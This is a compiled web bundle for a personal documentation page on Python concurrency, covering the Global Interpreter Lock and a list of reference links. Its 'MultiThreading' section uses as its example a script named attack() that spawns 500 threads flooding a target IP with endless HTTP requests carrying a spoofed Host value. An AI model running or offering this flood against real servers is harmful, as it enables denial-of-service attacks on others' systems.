"use strict";(self.webpackChunk=self.webpackChunk||[]).push([[9645],{603905:(e,t,n)=>{n.d(t,{Zo:()=>s,kt:()=>y});var r=n(667294);function a(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function c(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){a(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function i(e,t){if(null==e)return{};var n,r,a=function(e,t){if(null==e)return{};var n,r,a={},o=Object.keys(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||(a[n]=e[n]);return a}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(a[n]=e[n])}return a}var p=r.createContext({}),l=function(e){var t=r.useContext(p),n=t;return e&&(n="function"==typeof e?e(t):c(c({},t),e)),n},s=function(e){var t=l(e.components);return r.createElement(p.Provider,{value:t},e.children)},u="mdxType",h={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},d=r.forwardRef((function(e,t){var n=e.components,a=e.mdxType,o=e.originalType,p=e.parentName,s=i(e,["components","mdxType","originalType","parentName"]),u=l(n),d=a,y=u["".concat(p,".").concat(d)]||u[d]||h[d]||o;return n?r.createElement(y,c(c({ref:t},s),{},{components:n})):r.createElement(y,c({ref:t},s))}));function y(e,t){var n=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var o=n.length,c=new Array(o);c[0]=d;var i={};for(var p in t)hasOwnProperty.call(t,p)&&(i[p]=t[p]);i.originalType=e,i[u]="string"==typeof e?e:a,c[1]=i;for(var l=2;l<o;l++)c[l]=n[l];return r.createElement.apply(null,c)}return r.createElement.apply(null,n)}d.displayName="MDXCreateElement"},262274:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>p,contentTitle:()=>c,default:()=>h,frontMatter:()=>o,metadata:()=>i,toc:()=>l});var r=n(487462),a=(n(667294),n(603905));const o={},c="Concurrency",i={unversionedId:"python/advanced/concurrency",id:"python/advanced/concurrency",title:"Concurrency",description:"Global Interpreter Lock (GIL)",source:"@site/docs/python/advanced/concurrency.md",sourceDirName:"python/advanced",slug:"/python/advanced/concurrency",permalink:"/python/advanced/concurrency",draft:!1,editUrl:"https://github.com/deepaksood619/deepaksood619.github.io/tree/main/docs/python/advanced/concurrency.md",tags:[],version:"current",lastUpdatedAt:1677955187,formattedLastUpdatedAt:"Mar 4, 2023",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Architecture",permalink:"/python/advanced/architecture"},next:{title:"CPython",permalink:"/python/advanced/cpython"}},p={},l=[{value:"Global Interpreter Lock (GIL)",id:"global-interpreter-lock-gil",level:2},{value:"References",id:"references",level:2},{value:"MultiThreading",id:"multithreading",level:2}],s={toc:l},u="wrapper";function h(e){let{components:t,...n}=e;return(0,a.kt)(u,(0,r.Z)({},s,n,{components:t,mdxType:"MDXLayout"}),(0,a.kt)("h1",{id:"concurrency"},"Concurrency"),(0,a.kt)("h2",{id:"global-interpreter-lock-gil"},"Global Interpreter Lock (GIL)"),(0,a.kt)("p",null,"GIL is a mutex that protects access to Python objects, preventing multiple threads from executing Python bytecodes at once. This lock is necessary mainly because CPython's memory management is not thread-safe."),(0,a.kt)("p",null,"This essentially means that a process can run only one thread at a time. When a thread starts running, it acquires GIL and when it waits for I/O, it releases the GIL, so that other threads of that process can run."),(0,a.kt)("p",null,"Solution -"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"Run multiple Python instances")),(0,a.kt)("h2",{id:"references"},"References"),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"https://wiki.python.org/moin/GlobalInterpreterLock"},"https://wiki.python.org/moin/GlobalInterpreterLock")),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"https://pybay.com/site_media/slides/raymond2017-keynote/index.html"},"https://pybay.com/site_media/slides/raymond2017-keynote/index.html")),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"https://www.youtube.com/watch?v=9zinZmE3Ogk&index=2&list=WL&t=0s"},"Raymond Hettinger, Keynote on Concurrency, PyBay 2017")),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"https://realpython.com/python-concurrency"},"https://realpython.com/python-concurrency")),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"https://www.toptal.com/python/beginners-guide-to-concurrency-and-parallelism-in-python"},"https://www.toptal.com/python/beginners-guide-to-concurrency-and-parallelism-in-python")),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"https://www.tutorialspoint.com/concurrency_in_python/index.htm"},"https://www.tutorialspoint.com/concurrency_in_python/index.htm")),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"https://www.youtube.com/watch?v=18B1pznaU1o"},(0,a.kt)("strong",{parentName:"a"},"Tutorial: Santiago Basulto - Python Concurrency: from beginner to pro"))),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"https://youtu.be/5pYKAoD3Apk"},"Back to Basics: Concurrency")," - C++"),(0,a.kt)("h2",{id:"multithreading"},"MultiThreading"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-python"},"import threading\n\nimport socket\n\ntarget = '10.0.0.138'\n\nport = 80\n\nfake_ip = '182.21.20.32'\n\ndef attack():\n\nwhile True:\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ns.connect((target, port))\n\ns.sendto((\"GET /\" + target + \" HTTP/1.1rn\").encode('ascii'), (target, port))\n\ns.sendto((\"Host: \" + fake_ip + \" rnrn\").encode('ascii'), (target, port))\n\ns.close()\n\nfor i in range(500):\n\nthread = threading.Thread(target=attack)\n\nthread.start()\n")),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"https://bovage.hashnode.dev/what-exactly-is-multithreading"},"https://bovage.hashnode.dev/what-exactly-is-multithreading")))}h.isMDXComponent=!0}}]);